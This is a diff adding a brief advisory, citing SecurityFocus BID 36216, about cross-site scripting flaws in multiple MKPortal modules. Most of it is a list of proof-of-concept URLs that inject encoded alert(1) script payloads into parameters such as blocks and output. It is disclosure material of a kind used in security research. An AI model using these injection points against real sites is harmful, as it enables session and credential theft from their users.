@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/36216/info
+
+Multiple modules of MKPortal are prone to cross-site scripting vulnerabilities because the software fails to sufficiently sanitize user-supplied data.
+
+Attacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials; other attacks are also possible. 
+
+http://www.example.com/index.php?ind=gbook&content=%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/index.php?ind=gbook&blocks=%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/index.php?ind=gbook&message=%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/index.php?ind=whois&blocks=%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/index.php?ind=lenta&output=%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/index.php?ind=lenta&blocks=%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/metric/?output=%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/metric/?error=%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/metric/?blocks=%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/index.php?ind=recommend&blocks=%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/Anekdot/?output=%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/Anekdot/?blocks=%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/Anekdot/?contents=%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/contact/index.php?blocks=%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/contact/mail.php?to=1@1.1&mess=2&subj=3&headers=4&name=5&teme=6&soob=7&email=2@2.2&output=%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/contact/mail.php?to=1@1.1&mess=2&subj=3&headers=4&name=5&teme=6&soob=7&email=2@2.2&blocks=%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/speed/?output=%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/speed/?blocks=%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/index.php?ind=horoscop&blocks=%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/index.php?ind=horoscop&output=%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/catphones/index.php?output=%3Cscript%3Ealert(1)%3C/script%3E
+http://www.example.com/catphones/index.php?blocks=%3Cscript%3Ealert(1)%3C/script%3E 
